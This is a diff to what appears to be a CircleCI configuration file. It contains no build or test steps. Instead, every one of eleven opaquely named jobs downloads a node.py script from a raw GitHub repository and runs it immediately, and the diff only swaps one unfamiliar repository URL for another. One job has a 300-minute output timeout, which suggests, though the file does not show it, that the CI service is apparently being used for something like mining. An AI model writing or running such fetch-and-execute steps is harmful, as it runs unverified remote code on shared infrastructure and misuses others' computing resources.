@@ -5,50 +5,50 @@ working_dir: &working_dir ~/app
     - run:
         name: A
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: B
         command: |
           sleep 10s          
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: C
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py 
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py 
     - run:
         name: D
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: E
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: F
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: G
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: H
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: I
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: J
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
     - run:
         name: K
         no_output_timeout: 300m
         command: |
           echo "..."
-          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
   working_directory: *working_dir
 
 version: 2.0
